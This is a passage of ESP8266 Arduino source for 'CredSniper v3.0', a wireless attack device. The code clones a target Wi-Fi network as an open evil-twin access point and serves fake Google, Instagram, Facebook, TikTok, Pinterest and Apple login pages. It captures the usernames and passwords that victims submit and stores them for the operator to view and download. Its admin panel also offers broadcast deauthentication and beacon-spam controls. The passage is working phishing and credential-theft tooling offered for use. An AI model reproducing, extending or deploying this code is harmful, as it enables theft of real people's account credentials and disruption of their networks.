      }
    }
  }
  
  Serial.println("[✓] All templates saved to SPIFFS");
}

// ========== STORAGE FUNCTIONS ==========
void saveToSPIFFS(String username, String password, String tmpl) {
  File file = SPIFFS.open(CAPTURE_FILE, "a");
  if (file) {
    String timestamp = String(millis() / 1000);
    String entry = "[" + timestamp + "] Template: " + tmpl + 
                   " | User: " + username + " | Pass: " + password;
    
    file.println(entry);
    file.close();
    
    Serial.println("[✓] Saved to SPIFFS: " + username);
  } else {
    Serial.println("[✗] Failed to save to SPIFFS");
  }
}

String getSPIFFSStats() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    File file = SPIFFS.open(CAPTURE_FILE, "r");
    if (file) {
      int lineCount = 0;
      while (file.available()) {
        String line = file.readStringUntil('\n');
        if (line.length() > 0) lineCount++;
      }
      file.close();
      return String(lineCount) + " credentials stored";
    }
  }
  return "No credentials file";
}

void deleteCredentialsFile() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    SPIFFS.remove(CAPTURE_FILE);
    Serial.println("[✓] Deleted credentials file");
  }
}

// ========== VIEW CREDENTIALS FUNCTION ==========
void handleViewCredentials() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    File file = SPIFFS.open(CAPTURE_FILE, "r");
    if (file) {
      String content = file.readString();
      file.close();
      
      int lineCount = 0;
      for (int i = 0; i < content.length(); i++) {
        if (content.charAt(i) == '\n') lineCount++;
      }
      
      String page = "<!DOCTYPE html><html><head>";
      page += "<meta charset='UTF-8'>";
      page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
      page += "<title>Captured Credentials</title>";
      page += "<style>";
      page += "body{font-family:Arial;background:#121212;color:#fff;margin:20px;padding:0;}";
      page += ".container{max-width:800px;margin:0 auto;}";
      page += ".header{margin-bottom:30px;text-align:center;}";
      page += ".header h1{color:#fff;margin-bottom:10px;}";
      page += ".credential-count{color:#aaa;margin-bottom:20px;}";
      page += ".credentials-box{background:#1e1e1e;padding:20px;border-radius:10px;font-family:monospace;white-space:pre-wrap;max-height:500px;overflow-y:auto;font-size:14px;line-height:1.5;}";
      page += ".actions{margin-top:25px;display:flex;gap:15px;flex-wrap:wrap;}";
      page += ".btn{padding:12px 20px;border:none;border-radius:6px;cursor:pointer;color:white;text-decoration:none;display:inline-block;font-size:14px;}";
      page += ".btn-primary{background:#3498db;}";
      page += ".btn-danger{background:#e74c3c;}";
      page += ".btn-back{background:#666;}";
      page += ".empty-state{text-align:center;padding:40px;color:#666;font-size:16px;}";
      page += "</style>";
      page += "</head><body>";
      page += "<div class='container'>";
      page += "<div class='header'>";
      page += "<h1>📊 Captured Credentials</h1>";
      page += "<div class='credential-count'>Total entries: " + String(lineCount) + "</div>";
      page += "</div>";
      
      if (content.length() > 0) {
        page += "<div class='credentials-box'>" + content + "</div>";
      } else {
        page += "<div class='empty-state'>No credentials captured yet</div>";
      }
      
      page += "<div class='actions'>";
      page += "<a href='/download-credentials' class='btn btn-primary'>📥 Download File</a>";
      page += "<a href='/?delete-credentials=1' class='btn btn-danger' onclick='return confirm(\"Delete ALL credentials? This cannot be undone!\")'>🗑️ Delete All</a>";
      page += "<a href='/' class='btn btn-back'>← Back to Admin</a>";
      page += "</div>";
      page += "</div>";
      page += "</body></html>";
      
      webServer.send(200, "text/html", page);
      return;
    }
  }
  
  String page = "<!DOCTYPE html><html><head>";
  page += "<meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  page += "<title>No Credentials</title>";
  page += "<style>body{font-family:Arial;background:#121212;color:#fff;margin:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}";
  page += ".container{text-align:center;padding:40px;background:#1e1e1e;border-radius:10px;}";
  page += "a{color:#3498db;text-decoration:none;margin-top:20px;display:inline-block;}</style>";
  page += "</head><body><div class='container'><h2>No credentials found</h2><p>No credentials have been captured yet.</p><a href='/'>← Back to Admin</a></div></body></html>";
  
  webServer.send(200, "text/html", page);
}

// ========== FIXED FILE LIST FUNCTIONS ==========
void invalidateFileCache() {
  cachedFileListHTML = "";
  cachedFileCount = -1;
  lastFileListUpdate = 0;
  lastFileCountUpdate = 0;
  Serial.println("[CACHE] File cache invalidated");
}

String getFileListHTML() {
  // If cache is fresh, return cached version
  if (cachedFileListHTML != "" && millis() - lastFileListUpdate < CACHE_DURATION) {
    return cachedFileListHTML;
  }
  
  Serial.println("[CACHE] Generating fresh file list");
  String fileList = "";
  Dir dir = SPIFFS.openDir("/");
  int fileCount = 0;
  
  while (dir.next()) {
    String filename = dir.fileName();
    if (filename.endsWith(".html") || filename.endsWith(".HTML")) {
      String displayName = filename.substring(1);
      
      // Remove extension
      if (displayName.endsWith(".html")) {
        displayName = displayName.substring(0, displayName.length() - 5);
      } else if (displayName.endsWith(".HTML")) {
        displayName = displayName.substring(0, displayName.length() - 5);
      }
      
      String lowerName = displayName;
      lowerName.toLowerCase();
      
      // Skip default templates
      if (lowerName != "index" && lowerName != "admin" &&
          lowerName != "google" && lowerName != "instagram" &&
          lowerName != "facebook" && lowerName != "tiktok" &&
          lowerName != "pinterest" && lowerName != "apple") {
        
        fileCount++;
        bool isCurrent = (currentTemplate == displayName);
        
        fileList += "<div class='file-item'>";
        fileList += "<div class='file-name'>" + displayName;
        if (isCurrent) fileList += " <span class='badge-current'>Current</span>";
        fileList += "</div>";
        fileList += "<div class='file-actions'>";
        
        if (!isCurrent) {
          fileList += "<form method='post' action='/?use-file=" + displayName + "' style='display:inline;'>";
          fileList += "<button type='submit' class='btn-action btn-use' onclick='this.disabled=true;this.form.submit();'>🎯 Use</button>";
          fileList += "</form>";
        }
        
        fileList += "<form method='post' action='/?delete-file=" + displayName + "' style='display:inline;'>";
        fileList += "<button type='submit' class='btn-action btn-delete' onclick='if(confirm(\"Delete " + displayName + ".html?\")) { this.disabled=true;this.form.submit(); } else { return false; }'>🗑️ Delete</button>";
        fileList += "</form>";
        fileList += "</div>";
        fileList += "</div>";
      }
    }
  }
  
  if (fileCount == 0) {
    fileList = "<div class='empty-state'>No custom templates uploaded yet</div>";
  }
  
  // Cache the result
  cachedFileListHTML = fileList;
  lastFileListUpdate = millis();
  cachedFileCount = fileCount;
  lastFileCountUpdate = millis();
  
  return fileList;
}

int getUploadedFileCount() {
  // Return cached count if fresh
  if (cachedFileCount >= 0 && millis() - lastFileCountUpdate < CACHE_DURATION) {
    return cachedFileCount;
  }
  
  // Calculate fresh count
  int count = 0;
  Dir dir = SPIFFS.openDir("/");
  
  while (dir.next()) {
    String filename = dir.fileName();
    if (filename.endsWith(".html") || filename.endsWith(".HTML")) {
      String nameOnly = filename.substring(1);
      if (nameOnly.endsWith(".html")) {
        nameOnly = nameOnly.substring(0, nameOnly.length() - 5);
      } else if (nameOnly.endsWith(".HTML")) {
        nameOnly = nameOnly.substring(0, nameOnly.length() - 5);
      }
      
      nameOnly.toLowerCase();
      
      if (nameOnly != "index" && nameOnly != "admin" &&
          nameOnly != "google" && nameOnly != "instagram" &&
          nameOnly != "facebook" && nameOnly != "tiktok" &&
          nameOnly != "pinterest" && nameOnly != "apple") {
        count++;
      }
    }
  }
  
  // Cache the result
  cachedFileCount = count;
  lastFileCountUpdate = millis();
  
  return count;
}

// ========== FILE MANAGEMENT FUNCTIONS ==========
void handleDeleteFile(String filename) {
  String fullPath = "/" + filename + ".html";
  
  // Don't allow deletion of default templates
  String lowerName = filename;
  lowerName.toLowerCase();
  
  if (lowerName == "google" || lowerName == "instagram" || lowerName == "facebook" || 
      lowerName == "tiktok" || lowerName == "pinterest" || lowerName == "apple") {
    Serial.println("[✗] Cannot delete default template: " + filename);
    uploadStatus = "❌ Cannot delete default template";
    return;
  }
  
  if (SPIFFS.exists(fullPath)) {
    SPIFFS.remove(fullPath);
    Serial.println("[✓] Deleted file: " + fullPath);
    invalidateFileCache(); // Clear cache
    
    if (currentTemplate == filename) {
      currentTemplate = "google";
      Serial.println("[!] Reverted to Google template");
    }
  }
}

// ========== RETURN TO ADMIN AP ==========
void returnToAdminAP() {
  Serial.println("\n[+] Returning to Admin AP");
  
  if (hotspotActive) {
    hotspotActive = false;
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    delay(300);
    WiFi.softAPConfig(apIP, apIP, subnet);
    WiFi.softAP("CredSniper", "dewdew5218");
    dnsServer.start(DNS_PORT, "*", apIP);
    
    Serial.println("[✓] Evil Twin stopped");
  }
}

// ========== EVIL TWIN FUNCTIONS ==========
void startEvilTwin() {
  if (selectedNetwork.ssid == "") {
    Serial.println("[-] No network selected");
    return;
  }
  
  if (isProcessing) {
    Serial.println("[-] System busy");
    return;
  }
  
  isProcessing = true;
  
  Serial.println("\n[+] Starting Evil Twin: " + selectedNetwork.ssid);
  
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(300);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP(selectedNetwork.ssid.c_str(), "", selectedNetwork.ch);
  dnsServer.start(DNS_PORT, "*", apIP);
  
  hotspotActive = true;
  
  Serial.println("[+] Evil Twin Active");
  isProcessing = false;
}

// ========== UTILITY FUNCTIONS ==========
String getTemplateHTML() {
  if (SPIFFS.exists("/" + currentTemplate + ".html")) {
    File file = SPIFFS.open("/" + currentTemplate + ".html", "r");
    if (file) {
      String content = file.readString();
      file.close();
      return content;
    }
  }
  
  if (SPIFFS.exists("/google.html")) {
    File file = SPIFFS.open("/google.html", "r");
    if (file) {
      String content = file.readString();
      file.close();
      return content;
    }
  }
  
  return FPSTR(TEMPLATE_GOOGLE);
}

String getTemplateName() {
  if (currentTemplate == "google") return "Google";
  else if (currentTemplate == "instagram") return "Instagram";
  else if (currentTemplate == "facebook") return "Facebook";
  else if (currentTemplate == "tiktok") return "TikTok";
  else if (currentTemplate == "pinterest") return "Pinterest";
  else if (currentTemplate == "apple") return "Apple";
  else return currentTemplate;
}

String formatBSSID(uint8_t* bssid) {
  char bssidStr[18];
  snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  return String(bssidStr);
}

void clearArray() {
  for (int i = 0; i < MAX_NETWORKS; i++) {
    networks[i].ssid = "";
    networks[i].ch = 0;
    memset(networks[i].bssid, 0, 6);
    networks[i].rssi = 0;
    networks[i].inRange = false;
  }
}

// ========== SCANNING FUNCTION ==========
void performScan() {
  if (isProcessing) return;
  
  isProcessing = true;
  Serial.println("[+] Scanning networks...");
  
  int n = WiFi.scanNetworks(false, true);
  
  for (int i = 0; i < MAX_NETWORKS; i++) {
    networks[i].inRange = false;
  }
  
  if (n > 0) {
    int cnt = (n < MAX_NETWORKS) ? n : MAX_NETWORKS;
    for (int i = 0; i < cnt; i++) {
      networks[i].ssid = WiFi.SSID(i);
      networks[i].ch = WiFi.channel(i);
      networks[i].rssi = WiFi.RSSI(i);
      networks[i].inRange = true;
      
      uint8_t* bssid = WiFi.BSSID(i);
      if (bssid) {
        memcpy(networks[i].bssid, bssid, 6);
      }
    }
    
    for (int i = cnt; i < MAX_NETWORKS; i++) {
      networks[i].ssid = "";
    }
    
    Serial.println("[+] Found " + String(cnt) + " networks");
  } else {
    clearArray();
  }
  
  if (selectedNetwork.ssid != "") {
    bool found = false;
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (networks[i].ssid == selectedNetwork.ssid && 
          memcmp(networks[i].bssid, selectedNetwork.bssid, 6) == 0) {
        found = true;
        break;
      }
    }
    
    if (!found) {
      Serial.println("[!] Selected network is out of range: " + selectedNetwork.ssid);
      selectedNetwork.ssid = "";
    }
  }
  
  WiFi.scanDelete();
  isProcessing = false;
}

// ========== FILE UPLOAD HANDLER ==========
void handleFileUpload() {
  HTTPUpload& upload = webServer.upload();
  static File uploadFile;
  
  if (upload.status == UPLOAD_FILE_START) {
    String filename = upload.filename;
    if (!filename.endsWith(".html")) {
      filename += ".html";
    }
    
    uploadFile = SPIFFS.open("/" + filename, "w");
    if (!uploadFile) {
      Serial.println("[-] Failed to open file for writing: " + filename);
      uploadStatus = "❌ Error: Could not create file";
      return;
    }
    
    Serial.println("[+] Upload Start: " + filename);
    uploadStatus = "📤 Uploading: " + filename;
    
  } else if (upload.status == UPLOAD_FILE_WRITE) {
    if (uploadFile) {
      uploadFile.write(upload.buf, upload.currentSize);
    }
    
  } else if (upload.status == UPLOAD_FILE_END) {
    if (uploadFile) {
      uploadFile.close();
      Serial.println("\n[✓] Upload Complete: " + upload.filename);
      uploadStatus = "✅ Uploaded: " + upload.filename;
      invalidateFileCache(); // Clear cache after upload
    } else {
      uploadStatus = "❌ Upload failed";
    }
    
  } else if (upload.status == UPLOAD_FILE_ABORTED) {
    if (uploadFile) {
      uploadFile.close();
    }
    Serial.println("[-] Upload aborted");
    uploadStatus = "❌ Upload aborted";
  }
}

// ========== CAPTURE HANDLER ==========
void handleCapture() {
  if (hotspotActive) {
    String username = "";
    String password = "";
    
    for (int i = 0; i < webServer.args(); i++) {
      String argName = webServer.argName(i);
      if (argName == "email" || argName == "username" || argName == "user" || argName == "apple_id") {
        username = webServer.arg(i);
      } else if (argName == "password" || argName == "pass") {
        password = webServer.arg(i);
      }
    }
    
    if (username != "" && password != "") {
      saveToSPIFFS(username, password, getTemplateName());
      
      Serial.println("\n[+] CREDENTIALS CAPTURED!");
      Serial.println("    Template: " + getTemplateName());
      Serial.println("    Username: " + username);
      Serial.println("    Password: " + password);
    }
    
    webServer.send(200, "text/html", FPSTR(SUCCESS_PAGE));
    
    delay(500);
    returnToAdminAP();
    
  } else {
    webServer.send(404, "text/plain", "Not Found");
  }
}

// ========== DOWNLOAD CREDENTIALS ==========
void handleDownloadCredentials() {
  if (SPIFFS.exists(CAPTURE_FILE)) {
    File file = SPIFFS.open(CAPTURE_FILE, "r");
    if (file) {
      webServer.sendHeader("Content-Type", "text/plain");
      webServer.sendHeader("Content-Disposition", "attachment; filename=credentials.txt");
      webServer.send(200, "text/plain", file.readString());
      file.close();
      Serial.println("[✓] Downloaded credentials file");
    } else {
      webServer.send(500, "text/plain", "Error opening file");
    }
  } else {
    webServer.send(404, "text/plain", "No credentials file found");
  }
}

// ========== FIXED ADMIN PANEL ==========
void showAdminPanel() {
  String page = "<!DOCTYPE html>";
  page += "<html><head>";
  page += "<meta charset='UTF-8'>";
  page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  page += "<title>CredSniper v3.0</title>";
  page += "<style>";
  
  // Base styles
  page += "* { -webkit-tap-highlight-color: transparent; box-sizing: border-box; margin: 0; padding: 0; }";
  page += "body { font-family: Arial; background: #121212; color: #fff; min-height: 100vh; padding: 15px; }";
  page += ".container { max-width: 800px; margin: 0 auto; }";
  
  // Header and status
  page += ".header { text-align: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #333; }";
  page += ".header h1 { font-size: 24px; margin-bottom: 8px; }";
  page += ".header p { color: #aaa; font-size: 14px; }";
  page += ".credit { margin-top: 5px; font-size: 12px; color: #666; }";
  page += ".status-box { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 15px; }";
  page += ".status-item { display: flex; justify-content: space-between; margin-bottom: 10px; }";
  page += ".status-label { color: #aaa; }";
  page += ".status-value { font-weight: 600; }";
  page += ".status-healthy { color: #2ecc71; }";
  page += ".status-warning { color: #f39c12; }";
  page += ".status-danger { color: #e74c3c; }";
  page += ".status-attack { color: #f39c12; }";
  page += ".status-spam { color: #9b59b6; }";
  
  // Card styles
  page += ".card { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 15px; }";
  page += ".card-title { font-size: 16px; font-weight: 600; margin-bottom: 12px; color: #fff; display: flex; align-items: center; gap: 6px; }";
  
  // Button styles
  page += ".btn { display: block; width: 100%; padding: 14px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600; text-align: center; cursor: pointer; margin-bottom: 10px; }";
  page += ".btn:active { transform: scale(0.98); }";
  page += ".btn-primary { background: #3498db; color: white; }";
  page += ".btn-success { background: #2ecc71; color: white; }";
  page += ".btn-danger { background: #e74c3c; color: white; }";
  page += ".btn-warning { background: #f39c12; color: white; }";
  page += ".btn-deauth { background: #9b59b6; color: white; }";
  page += ".btn-spam { background: #e67e22; color: white; }";
  page += ".btn-disabled { background: #555; color: #999; cursor: not-allowed; }";
  page += ".btn-disabled:active { transform: none; }";
  page += ".btn-small { padding: 8px 12px; font-size: 12px; width: auto; display: inline-block; margin-right: 8px; }";
  
  // Template grid
  page += ".template-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-bottom: 12px; }";
  page += ".template-btn { padding: 12px; border-radius: 8px; border: none; font-size: 14px; cursor: pointer; }";
  page += ".template-btn.active { border: 2px solid #2ecc71; }";
  
  // ========== FIXED NETWORK TABLE STYLES ==========
  page += ".network-table-container { margin-top: 10px; overflow-x: auto; -webkit-overflow-scrolling: touch; }";
  page += ".network-table-controls { display: flex; gap: 10px; margin-bottom: 10px; flex-wrap: wrap; }";
  page += ".network-table { min-width: 100%; border-collapse: collapse; border-spacing: 0; }";
  page += ".network-table th, .network-table td { padding: 8px 6px; text-align: left; border-bottom: 1px solid #333; white-space: nowrap; font-size: 11px; }";
  page += ".network-table th { background: #2a2a2a; color: #aaa; font-weight: 600; position: sticky; top: 0; }";
  page += ".network-table td { min-width: 80px; }";
  page += ".network-table tr:hover { background: rgba(255, 255, 255, 0.05); }";
  page += ".select-btn { padding: 4px 8px; background: #3498db; color: white; border: none; border-radius: 3px; font-size: 10px; cursor: pointer; }";
  page += ".select-btn.selected { background: #2ecc71; }";
  page += ".select-btn:disabled { background: #666; cursor: not-allowed; }";
  page += ".signal-bar { display: inline-flex; align-items: center; gap: 4px; }";
  page += ".signal-percent { font-size: 10px; background: rgba(255, 255, 255, 0.1); padding: 2px 5px; border-radius: 8px; }";
  page += ".signal-100, .signal-90 { color: #2ecc71; }";
  page += ".signal-75, .signal-50 { color: #f39c12; }";
  page += ".signal-25, .signal-0 { color: #e74c3c; }";
  
  // Upload Section Styles
  page += ".upload-section { background: #1e1e1e; border-radius: 10px; padding: 15px; margin-bottom: 15px; }";
  page += ".upload-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }";
  page += ".upload-area { border: 2px solid #555; border-radius: 8px; padding: 20px; text-align: center; margin-bottom: 15px; cursor: pointer; transition: all 0.3s; background: #2a2a2a; }";
  page += ".upload-area:hover { border-color: #3498db; }";
  page += ".upload-btn { display: inline-block; padding: 12px 20px; background: #9b59b6; color: white; border-radius: 6px; font-weight: 600; cursor: pointer; font-size: 14px; }";
  page += "input[type='file'] { display: none; }";
  page += ".upload-status { margin-top: 10px; padding: 10px; border-radius: 6px; text-align: center; font-size: 13px; }";
  page += ".upload-success { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }";
  page += ".upload-error { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }";
  
  // File List Styles
  page += ".files-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }";
  page += ".file-count { font-size: 14px; color: #aaa; }";
  page += ".file-list { background: #2a2a2a; border-radius: 8px; overflow: hidden; }";
  page += ".file-item { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; border-bottom: 1px solid #333; transition: background 0.2s; }";
  page += ".file-item:hover { background: #333; }";
  page += ".file-item:last-child { border-bottom: none; }";
  page += ".file-name { flex: 1; font-size: 14px; font-weight: 500; }";
  page += ".badge-current { background: #2ecc71; color: white; font-size: 10px; padding: 2px 6px; border-radius: 10px; margin-left: 8px; }";
  page += ".file-actions { display: flex; gap: 8px; }";
  page += ".btn-action { padding: 6px 12px; border: none; border-radius: 4px; font-size: 12px; cursor: pointer; transition: all 0.2s; }";
  page += ".btn-action:hover { transform: translateY(-1px); }";
  page += ".btn-use { background: #3498db; color: white; }";
  page += ".btn-download { background: #2ecc71; color: white; }";
  page += ".btn-delete { background: #e74c3c; color: white; }";
  page += ".empty-state { text-align: center; padding: 30px; color: #666; font-size: 14px; }";
  
  page += ".song-list { background: #2a2a2a; border-radius: 8px; padding: 10px; margin-top: 10px; font-size: 12px; color: #aaa; max-height: 100px; overflow-y: auto; }";
  page += ".song-list div { padding: 4px; border-bottom: 1px solid #333; }";
  page += ".song-list div:last-child { border-bottom: none; }";
  page += "</style>";
  page += "</head><body>";
  
  page += "<div class='container'>";
  
  // Header
  page += "<div class='header'>";
  page += "<h1>🎯 CredSniper v3.0</h1>";
  if (hotspotActive) {
    page += "<p>Evil Twin Mode | Auto-return after capture</p>";
  } else if (beaconSpamActive) {
    page += "<p>🐝 Beacon Spam Active | " + String(beaconPacketCounter) + " packets</p>";
  } else {
    page += "<p>CREATED BY| DAWOOD KHAN</p>";
  }
  page += "<div class='credit'>Made with ♥️ by Dawood</div>";
  page += "</div>";
  
  // Status
  page += "<div class='status-box'>";
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Mode:</span>";
  if (hotspotActive) {
    page += "<span class='status-value status-attack'>Evil Twin</span>";
  } else if (beaconSpamActive) {
    page += "<span class='status-value status-spam'>🐝 Beacon Spam</span>";
  } else {
    page += "<span class='status-value'>Admin</span>";
  }
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Target:</span>";
  if (selectedNetwork.ssid != "") {
    page += "<span class='status-value'>" + selectedNetwork.ssid + "</span>";
  } else {
    page += "<span class='status-value'>None</span>";
  }
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Template:</span>";
  page += "<span class='status-value'>" + getTemplateName() + "</span>";
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Credentials:</span>";
  page += "<span class='status-value'>" + getSPIFFSStats() + "</span>";
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Storage:</span>";
  page += "<span class='status-value'>" + getSPIFFSInfo() + "</span>";
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>RAM:</span>";
  page += "<span class='status-value'>" + getRAMInfo() + "</span>";
  page += "</div>";
  
  page += "<div class='status-item'>";
  page += "<span class='status-label'>Uptime:</span>";
  page += "<span class='status-value'>" + formatUptime() + "</span>";
  page += "</div>";
  page += "</div>";
  
  // Attack Controls
  page += "<div class='card'>";
  page += "<div class='card-title'>⚡ Attack Controls</div>";
  page += "<form method='post' action='/?scan=1'>";
  page += "<button class='btn btn-primary'>🔍 Scan Networks</button>";
  page += "</form>";
  
  if (selectedNetwork.ssid != "") {
    if (!hotspotActive && !beaconSpamActive) {
      page += "<form method='post' action='/?attack=eviltwin'>";
      page += "<button class='btn btn-warning'>🎣 Start Evil Twin</button>";
      page += "</form>";
      
      if (deauthing_active) {
        page += "<form method='post' action='/?deauth=stop'>";
        page += "<button class='btn btn-deauth'>🛑 Stop Deauth</button>";
        page += "</form>";
      } else {
        page += "<form method='post' action='/?deauth=start'>";
        page += "<button class='btn btn-deauth'>💣 Start Deauth (Broadcast)</button>";
        page += "</form>";
      }
    } else if (hotspotActive) {
      page += "<form method='post' action='/?attack=stop'>";
      page += "<button class='btn btn-danger'>🛑 Stop Evil Twin</button>";
      page += "</form>";
    }
  } else {
    page += "<button class='btn btn-disabled' disabled>Select a network first</button>";
  }
  
  // Beacon Spam Controls
  page += "<div style='margin-top: 15px; padding-top: 15px; border-top: 1px solid #333;'>";
  if (beaconSpamActive) {
    page += "<form method='post' action='/?beacon=stop'>";
    page += "<button class='btn btn-spam'>🐝 Stop Beacon Spam</button>";
    page += "</form>";
    page += "<div class='song-list'>";
    page += "<div><strong>Spamming:</strong> 70+ One Direction song SSIDs</div>";
    page += "<div>Packets sent: " + String(beaconPacketCounter) + "</div>";
    page += "<div>Channels: 1, 6, 11 (rotating)</div>";
    page += "<div>Speed: ~70 networks/second</div>";
    page += "</div>";
  } else {
    page += "<form method='post' action='/?beacon=start'>";
    page += "<button class='btn btn-spam'>🐝 Start Beacon Spam</button>";
    page += "</form>";
    page += "<div class='song-list'>";
    page += "<div><strong>Will create fake networks with:</strong></div>";
    page += "<div>• One Direction Song Titles</div>";
    page += "<div>• 1D Member Names</div>";
    page += "<div>• Album Names</div>";
    page += "<div>• Fan Club SSIDs</div>";
    page += "</div>";
  }
  page += "</div>";
  
  page += "</div>";
  
  // Template Selection
  page += "<div class='card'>";
  page += "<div class='card-title'>🎭 Portal Templates</div>";
  page += "<div class='template-grid'>";
  
  page += "<form method='post' action='/?template=google'>";
  page += "<button class='template-btn " + String(currentTemplate == "google" ? "active btn-success" : "btn-primary") + "'>";
  page += "🔵 Google";
  page += "</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?template=instagram'>";
  page += "<button class='template-btn " + String(currentTemplate == "instagram" ? "active btn-success" : "btn-primary") + "'>";
  page += "📸 Instagram";
  page += "</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?template=facebook'>";
  page += "<button class='template-btn " + String(currentTemplate == "facebook" ? "active btn-success" : "btn-primary") + "'>";
  page += "👥 Facebook";
  page += "</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?template=tiktok'>";
  page += "<button class='template-btn " + String(currentTemplate == "tiktok" ? "active btn-success" : "btn-primary") + "'>";
  page += "🎵 TikTok";
  page += "</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?template=pinterest'>";
  page += "<button class='template-btn " + String(currentTemplate == "pinterest" ? "active btn-success" : "btn-primary") + "'>";
  page += "📌 Pinterest";
  page += "</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?template=apple'>";
  page += "<button class='template-btn " + String(currentTemplate == "apple" ? "active btn-success" : "btn-primary") + "'>";
  page += "🍎 Apple";
  page += "</button>";
  page += "</form>";
  page += "</div>";
  page += "</div>";
  
  // Upload Section
  page += "<div class='upload-section'>";
  page += "<div class='upload-header'>";
  page += "<div class='card-title'>📁 Upload Custom Template</div>";
  page += "<div class='file-count'>" + String(getUploadedFileCount()) + " files uploaded</div>";
  page += "</div>";
  
  page += "<form id='uploadForm' method='post' action='/upload' enctype='multipart/form-data'>";
  page += "<div class='upload-area' onclick=\"document.getElementById('fileInput').click()\">";
  page += "<div style='margin-bottom: 10px;'>";
  page += "<svg width='48' height='48' viewBox='0 0 24 24' fill='#666' style='margin-bottom: 10px;'>";
  page += "<path d='M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z'/>";
  page += "</svg>";
  page += "</div>";
  page += "<div style='font-size: 14px; color: #aaa; margin-bottom: 5px;'>Click to select HTML file</div>";
  page += "<div style='font-size: 12px; color: #666;'>HTML template files only (.html)</div>";
  page += "</div>";
  page += "<input type='file' name='htmlfile' id='fileInput' accept='.html' required onchange='document.getElementById(\"uploadForm\").submit()'>";
  page += "</form>";
  
  if (uploadStatus != "") {
    page += "<div class='upload-status " + String(uploadStatus.startsWith("✅") ? "upload-success" : "upload-error") + "'>" + uploadStatus + "</div>";
  }
  
  // File List
  page += "<div class='files-header' style='margin-top: 25px;'>";
  page += "<div class='card-title'>📄 Uploaded Templates</div>";
  page += "</div>";
  
  page += "<div class='file-list'>";
  page += getFileListHTML();
  page += "</div>";
  
  page += "</div>";
  
  // Networks Table - FIXED VERSION
  page += "<div class='card'>";
  page += "<div class='card-title'>📡 Available Networks</div>";
  
  // Network Table Controls
  page += "<div class='network-table-controls'>";
  page += "<form method='post' action='/?scan=1'>";
  page += "<button type='submit' class='btn btn-primary btn-small'>🔍 SCAN</button>";
  page += "</form>";
  
  page += "<form method='post' action='/?clear-selection=1'>";
  page += "<button type='submit' class='btn btn-danger btn-small'>🗑️ CLEAR SELECTION</button>";
  page += "</form>";
  page += "</div>";
  
  if (selectedNetwork.ssid != "") {
    page += "<p style='margin-bottom: 10px; font-size: 14px; color: #2ecc71;'>Selected: " + selectedNetwork.ssid + " (CH " + String(selectedNetwork.ch) + " | BSSID: " + formatBSSID(selectedNetwork.bssid) + ")</p>";
  }
  
  page += "<div class='network-table-container'>";
  page += "<table class='network-table'>";
  page += "<tr><th>SSID</th><th>BSSID</th><th>CH</th><th>SIG</th><th>SELECT</th></tr>";
  
  bool hasNetworks = false;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid == "") continue;
    
    hasNetworks = true;
    bool isSelected = (selectedNetwork.ssid == networks[i].ssid);
    bool isInRange = networks[i].inRange;
    int signalPercent = getSignalQuality(networks[i].rssi);
    String signalClass = "signal-" + String(signalPercent);
    
    page += "<tr" + String(!isInRange ? " class='network-out-of-range'" : "") + ">";
    page += "<td>" + networks[i].ssid + "</td>";
    page += "<td><span style='font-family: monospace; font-size: 10px; color: #aaa;'>" + formatBSSID(networks[i].bssid) + "</span></td>";
    page += "<td>" + String(networks[i].ch) + "</td>";
    page += "<td><div class='signal-bar'><span class='signal-percent " + signalClass + "'>" + String(signalPercent) + "%</span></div></td>";
    page += "<td>";
    
    if (isInRange) {
      page += "<form method='post' action='/?ap=" + String(i) + "' style='display:inline;'>";
      page += "<button type='submit' class='select-btn" + String(isSelected ? " selected" : "") + "'>";
      page += isSelected ? "✓ Selected" : "Select";
      page += "</button>";
      page += "</form>";
    } else {
      page += "<button class='select-btn' disabled>Out of Range</button>";
    }
    
    page += "</td>";
    page += "</tr>";
  }
  
  if (!hasNetworks) {
    page += "<tr><td colspan='5' style='text-align:center; padding: 20px; color: #666;'>No networks found. Click Scan.</td></tr>";
  }
  
  page += "</table>";
  page += "</div>";
  page += "</div>";
  
  // Credentials Management
  page += "<div class='card'>";
  page += "<div class='card-title'>🔐 Credentials Management</div>";
  page += "<div class='file-actions' style='margin-bottom: 0;'>";
